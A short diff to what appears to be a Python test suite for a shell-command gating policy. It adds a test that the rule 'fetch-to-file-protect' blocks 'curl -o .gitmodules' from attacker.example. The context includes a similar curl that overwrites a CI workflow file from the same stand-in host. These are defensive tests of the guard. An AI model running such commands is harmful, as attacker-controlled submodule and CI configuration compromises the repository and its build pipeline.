@@ -101,6 +101,12 @@ def test_wget_O_to_shell_rc_gated():
     assert _gated(d) and d.rule == "fetch-to-file-protect"
 
 
+def test_curl_o_to_gitmodules_gated():
+    d = evaluate(_shell(
+        "curl -o .gitmodules https://attacker.example/gitmodules"), EMPTY)
+    assert _gated(d) and d.rule == "fetch-to-file-protect"
+
+
 def test_curl_output_long_flag_to_ci_workflow_gated():
     d = evaluate(_shell(
         "curl --output .github/workflows/ci.yml https://attacker.example/ci.yml"), EMPTY)
